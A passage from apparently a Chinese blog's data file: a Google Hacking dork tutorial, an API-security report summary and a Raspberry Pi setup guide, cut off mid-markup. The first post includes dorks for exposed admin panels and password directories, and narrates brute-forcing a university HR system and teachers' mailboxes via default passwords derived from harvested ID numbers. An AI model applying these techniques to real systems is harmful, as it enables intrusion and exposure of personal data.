未被锁定install页面,网站配置密码,php远程文件包含漏洞等重要信息.</p>\n<h4 id=\"基本检索\"><a href=\"#基本检索\" class=\"headerlink\" title=\"基本检索\"></a>基本检索</h4><ul>\n<li>逻辑与: and</li>\n<li>逻辑或: or</li>\n<li>逻辑非: -</li>\n<li>完整匹配: “关键词”</li>\n<li>通配符: * ?</li>\n<li>…</li>\n<li>……</li>\n</ul>\n<h4 id=\"高级检索\"><a href=\"#高级检索\" class=\"headerlink\" title=\"高级检索\"></a>高级检索</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.intext</span><br></pre></td></tr></table></figure>\n<p>检索某个正文中含有关键字的网页,例如:intext:”后台登录”,将只返回正文中包含后台登录的网页.</p>\n<p>intext:”后台登陆”</p>\n<p><img src=\"/images/edu/1.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2.intitle</span><br></pre></td></tr></table></figure>\n<p>检索标题中含有关键字的网页,例如:intitle:后台登录,将只返回标题中包含”后台登录”的网页,当然也可以使用其他关键字进行检索.</p>\n<p>intitle:”后台登陆”</p>\n<p><img src=\"/images/edu/2.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3.inurl</span><br></pre></td></tr></table></figure>\n<p>检索URL中包含关键词的网页:例如:inurl:Login,将返回URL中含有Login的网页,很多小伙伴应该还记得在学习SQL注入时这条检索应该运用很多次,inurl:php id=.</p>\n<p>inurl:login<br><img src=\"/images/edu/3.png\"></p>\n<p>检索管理员登录页面<br>inurl:/admin/login.php</p>\n<p><img src=\"/images/edu/4.png\"></p>\n<p>检索phpmyadmin管理页<br>inurl:/phpmyadmin/index.php</p>\n<p><img src=\"/images/edu/5.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4.site</span><br></pre></td></tr></table></figure>\n<p>检索指定域名/关键字,例如:site:baidu.com inurl:login,将只在baidu.com中检索含有Login的网页.</p>\n<p>site:baidu.com inurl:login</p>\n<p><img src=\"/images/edu/6.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5.filetype</span><br></pre></td></tr></table></figure>\n<p>检索指定域名内的指定文件类型,例如:<code>site:baidu.com filetype:doc</code>,将返回baidu.com内且文件类型为doc的网页.</p>\n<p>site:baidu.com filetype:doc</p>\n<p><img src=\"/images/edu/7.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6.link</span><br></pre></td></tr></table></figure>\n<p>检索指定域名的网页,例:<code>link:www.baidu.com</code>,将返回所有包含<code>www.baidu.com</code>关键字的网页.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">link:www.baidu.com</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/edu/8.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7.related</span><br></pre></td></tr></table></figure>\n\n<p>检索相似类型的网页,例如:<code>related:www.hebut.edu.cn</code>,将返回与<code>www.hebut.edu.cn</code>相似的页面,相似指的是网页的布局相似.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">related:www.hebut.edu.cn</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/edu/9.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8.Index of</span><br></pre></td></tr></table></figure>\n<p>Index of语法去发现允许目录浏览的web网站,就像在本地的普通目录一样,下面是一些有趣的查询.</p>\n<ul>\n<li><p>index of /admin</p>\n</li>\n<li><p>index of /passwd</p>\n</li>\n<li><p>index of /password</p>\n</li>\n<li><p>index of /logs</p>\n</li>\n<li><p>index of /config</p>\n</li>\n<li><p>index of /mail</p>\n</li>\n<li><p>….</p>\n<p>index of /logs</p>\n</li>\n</ul>\n<p><img src=\"/images/edu/10.png\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">小姐(结)</span><br></pre></td></tr></table></figure>\n<p>关于Google Hacking还有很多可用语法使用,具体可以网上查找这里不做更深入介绍.已选择移步到:<a href=\"https://www.exploit-db.com/google-hacking-database\">Google Hacing DB</a>.</p>\n<h2 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h2><h3 id=\"子域名收集\"><a href=\"#子域名收集\" class=\"headerlink\" title=\"子域名收集\"></a>子域名收集</h3><p><img src=\"/images/edu/11.png\"></p>\n<p>找到一个HR系统<br>针对学校的很多是工号进行登陆,检索学校老师工号两种方式:学校官网&amp;其他系统、Google Hacking(企业类测试基本相符)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:XXXX.edu.cn intext:&quot;工号&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/edu/12.png\"></p>\n<h3 id=\"获取工号\"><a href=\"#获取工号\" class=\"headerlink\" title=\"获取工号\"></a>获取工号</h3><p>尝试登陆,提示密码错误.<br><img src=\"/images/edu/13.png\"></p>\n<h3 id=\"爆破\"><a href=\"#爆破\" class=\"headerlink\" title=\"爆破\"></a>爆破</h3><p><img src=\"/images/edu/14.png\"></p>\n<p>显示只是普通老师的个人信息,没什么利用价值, 看到审批信息需人事审核,想必人事可获取很多信息.</p>\n<h3 id=\"Google检索\"><a href=\"#Google检索\" class=\"headerlink\" title=\"Google检索\"></a>Google检索</h3><p>找到人事工号了<br>(这里说下,这个学校的邮箱是通过工号作为前缀)</p>\n<p><img src=\"/images/edu/15.png\"></p>\n<h3 id=\"爆破-1\"><a href=\"#爆破-1\" class=\"headerlink\" title=\"爆破\"></a>爆破</h3><p>393条老师信息<br><img src=\"/images/edu/16.png\"></p>\n<h3 id=\"撸下邮箱\"><a href=\"#撸下邮箱\" class=\"headerlink\" title=\"撸下邮箱\"></a>撸下邮箱</h3><p>Google后提示邮箱默认密码是身份证号后6位,借此之前hr系统内可以获取身份证号信息,随机登陆测试.<br><img src=\"/images/edu/17.png\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>不管是针对学校类还是企业的测试,弱口令总是存在,则测试中此漏洞的利用程度较高;其中以上大部分占比还是信息收集部分做了充足的准备.</p>\n<h3 id=\"小建议\"><a href=\"#小建议\" class=\"headerlink\" title=\"小建议\"></a>小建议</h3><ol>\n<li>因这个测试基本都是使用Google Hacking测试,则在信息收集部分只做了此类部分介绍;其他类还请自行补充.(希望后期学习Google Hacking再单独贴出).</li>\n<li>针对学校类测试建议多google、多查学校通知类文件信息,总有一款适合你.</li>\n<li>如果企业的SRC挖不到或许可以通过测试学校类来学习更多方式吧,总之,多测、多练、多收集.</li>\n<li>多看书,多学习,多总结,多笔记,多回顾,多完善….</li>\n</ol>\n"},{"title":"应用程序接口(API)数据安全研究报告","date":"2020-07-27T09:09:17.000Z","_content":"\n\n​\t应用程序接口（Application Programming Interface，API）在互联网时代向大数据时代快速过渡的浪潮中承担着连接服务和传输数据的重任。近年来，国内外发生多起由于API漏洞被恶意攻击或安全管理疏漏导致的数据安全事件，对相关企业和用户权益造成严重损害。\n\n![api](/images/api.jpg)\n\n​\t伴随着云计算、大数据、人工智能等技术的蓬勃发展，移动互联网、物联网产业加速创新，移动设备持有量不断增加，Web应用、移动应用已融入生产生活的各个领域。这一过程中，应用程序接口（Application Programming Interface，API）作为数据传输流转的重要通道发挥着举足轻重的作用。API技术不仅帮助企业建立与客户沟通的桥梁，还承担着不同复杂系统环境、组织机构之间的数据交互、传输的重任。然而，在API技术带来上述积极作用的同时，与其相关的数据安全问题也日益凸显。\n\n[应用程序接口（API）数据安全研究报告（2020年）.pdf](http://www.caict.ac.cn/kxyj/qwfb/ztbg/202007/P020200727599918681913.pdf)\n\n","source":"_posts/应用程序接口数据安全研究报告.md","raw":"---\ntitle: 应用程序接口(API)数据安全研究报告\ndate: 2020-07-27 17:09:17\ntag:\n\t- 文档\n---\n\n\n​\t应用程序接口（Application Programming Interface，API）在互联网时代向大数据时代快速过渡的浪潮中承担着连接服务和传输数据的重任。近年来，国内外发生多起由于API漏洞被恶意攻击或安全管理疏漏导致的数据安全事件，对相关企业和用户权益造成严重损害。\n\n![api](/images/api.jpg)\n\n​\t伴随着云计算、大数据、人工智能等技术的蓬勃发展，移动互联网、物联网产业加速创新，移动设备持有量不断增加，Web应用、移动应用已融入生产生活的各个领域。这一过程中，应用程序接口（Application Programming Interface，API）作为数据传输流转的重要通道发挥着举足轻重的作用。API技术不仅帮助企业建立与客户沟通的桥梁，还承担着不同复杂系统环境、组织机构之间的数据交互、传输的重任。然而，在API技术带来上述积极作用的同时，与其相关的数据安全问题也日益凸显。\n\n[应用程序接口（API）数据安全研究报告（2020年）.pdf](http://www.caict.ac.cn/kxyj/qwfb/ztbg/202007/P020200727599918681913.pdf)\n\n","slug":"应用程序接口数据安全研究报告","published":1,"updated":"2020-10-23T03:31:29.516Z","_id":"ckglobhe3000wb1hq315g1lnh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>​    应用程序接口（Application Programming Interface，API）在互联网时代向大数据时代快速过渡的浪潮中承担着连接服务和传输数据的重任。近年来，国内外发生多起由于API漏洞被恶意攻击或安全管理疏漏导致的数据安全事件，对相关企业和用户权益造成严重损害。</p>\n<p><img src=\"/images/api.jpg\" alt=\"api\"></p>\n<p>​    伴随着云计算、大数据、人工智能等技术的蓬勃发展，移动互联网、物联网产业加速创新，移动设备持有量不断增加，Web应用、移动应用已融入生产生活的各个领域。这一过程中，应用程序接口（Application Programming Interface，API）作为数据传输流转的重要通道发挥着举足轻重的作用。API技术不仅帮助企业建立与客户沟通的桥梁，还承担着不同复杂系统环境、组织机构之间的数据交互、传输的重任。然而，在API技术带来上述积极作用的同时，与其相关的数据安全问题也日益凸显。</p>\n<p><a href=\"http://www.caict.ac.cn/kxyj/qwfb/ztbg/202007/P020200727599918681913.pdf\">应用程序接口（API）数据安全研究报告（2020年）.pdf</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>​    应用程序接口（Application Programming Interface，API）在互联网时代向大数据时代快速过渡的浪潮中承担着连接服务和传输数据的重任。近年来，国内外发生多起由于API漏洞被恶意攻击或安全管理疏漏导致的数据安全事件，对相关企业和用户权益造成严重损害。</p>\n<p><img src=\"/images/api.jpg\" alt=\"api\"></p>\n<p>​    伴随着云计算、大数据、人工智能等技术的蓬勃发展，移动互联网、物联网产业加速创新，移动设备持有量不断增加，Web应用、移动应用已融入生产生活的各个领域。这一过程中，应用程序接口（Application Programming Interface，API）作为数据传输流转的重要通道发挥着举足轻重的作用。API技术不仅帮助企业建立与客户沟通的桥梁，还承担着不同复杂系统环境、组织机构之间的数据交互、传输的重任。然而，在API技术带来上述积极作用的同时，与其相关的数据安全问题也日益凸显。</p>\n<p><a href=\"http://www.caict.ac.cn/kxyj/qwfb/ztbg/202007/P020200727599918681913.pdf\">应用程序接口（API）数据安全研究报告（2020年）.pdf</a></p>\n"},{"title":"树莓派","date":"2020-09-24T01:15:40.000Z","_content":"\n![pi4-labelled](/images/树莓派/pi4-labelled.jpg)\n\n#### Centos下载\n\n```\n链接内包含支持树莓派centos系统（这里我选择字符）\nhttp://mirror.nyherji.is/centos-altarch/7.8.2003/isos/armhfp/\nRaspberryPI-GNOME\t\t\t图形\nRaspberryPI-KDE\t\t\t\t图形\nRaspberryPI-Minimal\t\t字符\n```\n\n下载解压得到\n\n`CentOS-Userland-7-armv7hl-RaspberryPI-Minimal-1810-sda.raw`\n\n![image-20200908154046290](/images/树莓派/image-20200908154046290.png)\n\n#### TF格式化\n\n![image-20200908154105219](/images/树莓派/image-20200908154105219.png)\n\n#### iOS写入\n\n![image-20200908154019220](/images/树莓派/image-20200908154019220.png)\n\n\n\n#### 内存卡剩余空间\n\ndf  -h\n\n![image-20200908162605423](/images/树莓派/image-20200908162605423.png)\n\n一行命令\n\n```\n/usr/bin/rootfs-expand\n```\n\n![image-20200908162627706](/images/树莓派/image-20200908162627706.png)\n\n#### 树莓派安装docker\n\n```shell\n参考：\nhttps://raspberrypi.stackexchange.com/questions/85654/installing-docker-on-rpi-3b-with-centos\nsudo yum install docker -y\nsystemctl start docker\n```\n\n![image-20200921094330236](/images/树莓派/image-20200921094330236.png)\n\n\n\n#### 树莓派配置yum源\n\n```shell\nvi /etc/yum.repos.d/epel.repo\n\n[epel]\nname=Extra Packages for Enterprise Linux 7\nbaseurl=http://ftp.sjtu.edu.cn/fedora/epel/7/aarch64/\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7\n```\n\n```shell\nyum update\n```\n\n树莓派安装nodejs\n\n```shell\n# 先安装nvm\ngit clone https://github.com/creationix/nvm.git\nsource nvm/nvm.sh\n# nvm安装nodejs，版本14.11.0\nnvm install 14.11.0\n```\n\n如出现以下报错\n\n![image-20200922144343526](/images/树莓派/image-20200922144343526.png)\n\n```shell\n# 如镜像源无法检索到此so库文件，可更换以上yum源\nyum install libatomic -y\n```\n\n如出现以下报错，说明gcc动态库版本较低\n\n![image-20200922144613897](/images/树莓派/image-20200922144613897.png)\n\n```\nhttps://itbilu.com/linux/management/NymXRUieg.html\n# 官方对比gcc版本信息，并进行下载\nhttps://gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html\n```\n\n```\nstrings /usr/lib/libstdc++.so.6 | grep GLIBCXX\n```\n\n#### gcc更新\n\n```shell\n# gcc版本查看\ngcc --version\n# 下载对应版本\nwget https://ftp.gnu.org/gnu/gcc/gcc-6.1.0/gcc-6.1.0.tar.gz\n# yum提前安装部分插件\nyum install -y glibc-static libstdc++-static\nyum install gcc gcc-c++\n# 解压到指定目录下\ntar -xvf gcc-6.1.0.tar.bz2 -C /usr/local/src\n# 切换目录\ncd /usr/local/src/gcc-6.1.0\n# 下载一些必备的依赖程序\n./contrib/download_prerequisites\n# 依赖文件n\nyum install gmp、mpfr、mpc\n# 编译前，创建文件夹\nmkdir /usr/local/build/gcc-6.1.0\n# 切换目录\ncd /usr/local/build/gcc-6.1.0\n# 调用gcc源程序的configure(后面的参数选项可根据需要自行修改)，用于配置gcc\n如果报：gnu/stubs-soft.h: No such file or directory，执行以下语句\n/usr/local/src/gcc-6.1.0/configure --enable-checking=release --enable-languages=c,c++ --disable-multilib --with-float=hard\n\n# 编译gcc源程序\nmake\n# 安装gcc\nmake install\n# 查看 gcc版本\ngcc --version\n# 如果发现gcc版本还是之前的。可直接进行以下操作不影响node环境运行。\n# 查看当前so库信息\nstrings /usr/lib/libstdc++.so.6 | grep GLIBC\n# 查找系统内是否存在其他版本的so库文件\nfind / -name libstdc++.so.6*\n# 根据搜索版本进行拷贝\ncp /usr/local/lib/libstdc++.so.6.0.22 /usr/lib\n# 删除软链接（切记不要删除之前的so库文件）\nrm -rf /usr/lib/libstdc++.so.6\n# 新建软链接\nln -s /usr/lib/libstdc++.so.6.0.22 /usr/lib/libstdc++.so.6\n```\n\n#### gcc更新参考\n\n```\nhttps://bbs.huaweicloud.com/forum/thread-20440-1-1.html\nhttps://www.colabug.com/2020/0607/7439328/\n```\n\n","source":"_posts/树莓派.md","raw":"---\ntitle: 树莓派\ndate: 2020-09-24 09:15:40\ntags:\n - 树莓派\n---\n\n![pi4-labelled](/images/树莓派/pi4-labelled.jpg)\n\n#### Centos下载\n\n```\n链接内包含支持树莓派centos系统（这里我选择字符）\nhttp://mirror.nyherji.is/centos-altarch/7.8.2003/isos/armhfp/\nRaspberryPI-GNOME\t\t\t图形\nRaspberryPI-KDE\t\t\t\t图形\nRaspberryPI-Minimal\t\t字符\n```\n\n下载解压得到\n\n`CentOS-Userland-7-armv7hl-RaspberryPI-Minimal-1810-sda.raw`\n\n![image-20200908154046290](/images/树莓派/image-20200908154046290.png)\n\n#### TF格式化\n\n![image-20200908154105219](/images/树莓派/image-20200908154105219.png)\n\n#### iOS写入\n\n![image-20200908154019220](/images/树莓派/image-20200908154019220.png)\n\n\n\n#### 内存卡剩余空间\n\ndf  -h\n\n![image-20200908162605423](/images/树莓派/image-20200908162605423.png)\n\n一行命令\n\n```\n/usr/bin/rootfs-expand\n```\n\n![image-20200908162627706](/images/树莓派/image-20200908162627706.png)\n\n#### 树莓派安装docker\n\n```shell\n参考：\nhttps://raspberrypi.stackexchange.com/questions/85654/installing-docker-on-rpi-3b-with-centos\nsudo yum install docker -y\nsystemctl start docker\n```\n\n![image-20200921094330236](/images/树莓派/image-20200921094330236.png)\n\n\n\n#### 树莓派配置yum源\n\n```shell\nvi /etc/yum.repos.d/epel.repo\n\n[epel]\nname=Extra Packages for Enterprise Linux 7\nbaseurl=http://ftp.sjtu.edu.cn/fedora/epel/7/aarch64/\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7\n```\n\n```shell\nyum update\n```\n\n树莓派安装nodejs\n\n```shell\n# 先安装nvm\ngit clone https://github.com/creationix/nvm.git\nsource nvm/nvm.sh\n# nvm安装nodejs，版本14.11.0\nnvm install 14.11.0\n```\n\n如出现以下报错\n\n![image-20200922144343526](/images/树莓派/image-20200922144343526.png)\n\n```shell\n# 如镜像源无法检索到此so库文件，可更换以上yum源\nyum install libatomic -y\n```\n\n如出现以下报错，说明gcc动态库版本较低\n\n![image-20200922144613897](/images/树莓派/image-20200922144613897.png)\n\n```\nhttps://itbilu.com/linux/management/NymXRUieg.html\n# 官方对比gcc版本信息，并进行下载\nhttps://gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html\n```\n\n```\nstrings /usr/lib/libstdc++.so.6 | grep GLIBCXX\n```\n\n#### gcc更新\n\n```shell\n# gcc版本查看\ngcc --version\n# 下载对应版本\nwget https://ftp.gnu.org/gnu/gcc/gcc-6.1.0/gcc-6.1.0.tar.gz\n# yum提前安装部分插件\nyum install -y glibc-static libstdc++-static\nyum install gcc gcc-c++\n# 解压到指定目录下\ntar -xvf gcc-6.1.0.tar.bz2 -C /usr/local/src\n# 切换目录\ncd /usr/local/src/gcc-6.1.0\n# 下载一些必备的依赖程序\n./contrib/download_prerequisites\n# 依赖文件n\nyum install gmp、mpfr、mpc\n# 编译前，创建文件夹\nmkdir /usr/local/build/gcc-6.1.0\n# 切换目录\ncd /usr/local/build/gcc-6.1.0\n# 调用gcc源程序的configure(后面的参数选项可根据需要自行修改)，用于配置gcc\n如果报：gnu/stubs-soft.h: No such file or directory，执行以下语句\n/usr/local/src/gcc-6.1.0/configure --enable-checking=release --enable-languages=c,c++ --disable-multilib --with-float=hard\n\n# 编译gcc源程序\nmake\n# 安装gcc\nmake install\n# 查看 gcc版本\ngcc --version\n# 如果发现gcc版本还是之前的。可直接进行以下操作不影响node环境运行。\n# 查看当前so库信息\nstrings /usr/lib/libstdc++.so.6 | grep GLIBC\n# 查找系统内是否存在其他版本的so库文件\nfind / -name libstdc++.so.6*\n# 根据搜索版本进行拷贝\ncp /usr/local/lib/libstdc++.so.6.0.22 /usr/lib\n# 删除软链接（切记不要删除之前的so库文件）\nrm -rf /usr/lib/libstdc++.so.6\n# 新建软链接\nln -s /usr/lib/libstdc++.so.6.0.22 /usr/lib/libstdc++.so.6\n```\n\n#### gcc更新参考\n\n```\nhttps://bbs.huaweicloud.com/forum/thread-20440-1-1.html\nhttps://www.colabug.com/2020/0607/7439328/\n```\n\n","slug":"树莓派","published":1,"updated":"2020-10-23T03:29:45.595Z","_id":"ckglobhe4000xb1hq96n3ebv1","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/pi4-labelled.jpg\" alt=\"pi4-labelled\"></p>\n<h4 id=\"Centos下载\"><a href=\"#Centos下载\" class=\"headerlink\" title=\"Centos下载\"></a>Centos下载</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">链接内包含支持树莓派centos系统（这里我选择字符）</span><br><span class=\"line\">http:&#x2F;&#x2F;mirror.nyherji.is&#x2F;centos-altarch&#x2F;7.8.2003&#x2F;isos&#x2F;armhfp&#x2F;</span><br><span class=\"line\">RaspberryPI-GNOME\t\t\t图形</span><br><span class=\"line\">RaspberryPI-KDE\t\t\t\t图形</span><br><span class=\"line\">RaspberryPI-Minimal\t\t字符</span><br></pre></td></tr></table></figure>\n\n<p>下载解压得到</p>\n<p><code>CentOS-Userland-7-armv7hl-RaspberryPI-Minimal-1810-sda.raw</code></p>\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908154046290.png\" alt=\"image-20200908154046290\"></p>\n<h4 id=\"TF格式化\"><a href=\"#TF格式化\" class=\"headerlink\" title=\"TF格式化\"></a>TF格式化</h4><p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908154105219.png\" alt=\"image-20200908154105219\"></p>\n<h4 id=\"iOS写入\"><a href=\"#iOS写入\" class=\"headerlink\" title=\"iOS写入\"></a>iOS写入</h4><p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908154019220.png\" alt=\"image-20200908154019220\"></p>\n<h4 id=\"内存卡剩余空间\"><a href=\"#内存卡剩余空间\" class=\"headerlink\" title=\"内存卡剩余空间\"></a>内存卡剩余空间</h4><p>df  -h</p>\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908162605423.png\" alt=\"image-20200908162605423\"></p>\n<p>一行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;rootfs-expand</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200908162627706.png\" alt=\"image-20200908162627706\"></p>\n<h4 id=\"树莓派安装docker\"><a href=\"#树莓派安装docker\" class=\"headerlink\" title=\"树莓派安装docker\"></a>树莓派安装docker</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">参考：</span><br><span class=\"line\">https://raspberrypi.stackexchange.com/questions/85654/installing-docker-on-rpi-3b-with-centos</span><br><span class=\"line\">sudo yum install docker -y</span><br><span class=\"line\">systemctl start docker</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200921094330236.png\" alt=\"image-20200921094330236\"></p>\n<h4 id=\"树莓派配置yum源\"><a href=\"#树莓派配置yum源\" class=\"headerlink\" title=\"树莓派配置yum源\"></a>树莓派配置yum源</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/yum.repos.d/epel.repo</span><br><span class=\"line\"></span><br><span class=\"line\">[epel]</span><br><span class=\"line\">name=Extra Packages for Enterprise Linux 7</span><br><span class=\"line\">baseurl=http://ftp.sjtu.edu.cn/fedora/epel/7/aarch64/</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum update</span><br></pre></td></tr></table></figure>\n\n<p>树莓派安装nodejs</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 先安装nvm</span></span><br><span class=\"line\">git clone https://github.com/creationix/nvm.git</span><br><span class=\"line\">source nvm/nvm.sh</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> nvm安装nodejs，版本14.11.0</span></span><br><span class=\"line\">nvm install 14.11.0</span><br></pre></td></tr></table></figure>\n\n<p>如出现以下报错</p>\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200922144343526.png\" alt=\"image-20200922144343526\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如镜像源无法检索到此so库文件，可更换以上yum源</span></span><br><span class=\"line\">yum install libatomic -y</span><br></pre></td></tr></table></figure>\n\n<p>如出现以下报错，说明gcc动态库版本较低</p>\n<p><img src=\"/images/%E6%A0%91%E8%8E%93%E6%B4%BE/image-20200922144613897.png\" alt=\"image-20200922144613897\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;itbilu.com&#x2F;linux&#x2F;management&#x2F;NymXRUieg.html</span><br><span class=\"line\"># 官方对比gcc版本信息，并进行下载</span><br><span class=\"line\">https:&#x2F;&#x2F;gcc.gnu.org&#x2F;onlinedocs&#x2F;libstdc++&#x2F;manual&#x2F;abi.html</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings &#x2F;usr&#x2F;lib&#x2F;libstdc++.so.6 | grep GLIBCXX</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"gcc更新\"><a href=\"#gcc更新\" class=\"headerlink\" title=\"gcc更新\"></a>gcc更新</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> gcc版本查看</span></span><br><span class=\"line\">gcc --version</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载对应版本</span></span><br><span class=\"line\">wget https://ftp.gnu.org/gnu/gcc/gcc-6.1.0/gcc-6.1.0.tar.gz</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum提前安装部分插件</span></span><br><span class=\"line\">yum install -y glibc-static libstdc++-static</span><br><span class=\"line\">yum install gcc gcc-c++</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 解压到指定目录下</span></span><br><span class=\"line\">tar -xvf gcc-6.1.0.tar.bz2 -C /usr/local/src</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 切换目录</span></span><br><span class=\"line\">cd /usr/local/src/gcc-6.1.0</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载一些必备的依赖程序</span></span><br><span class=\"line\">./contrib/download_prerequisites</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 依赖文件n</span></span><br><span class=\"line\">yum install gmp、mpfr、mpc</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 编译前，创建文件夹</span></span><br><span class=\"line\">mkdir /usr/local/build/gcc-6.1.0</span><br><span class=\"line\"><span class=\"meta\">#</span><span 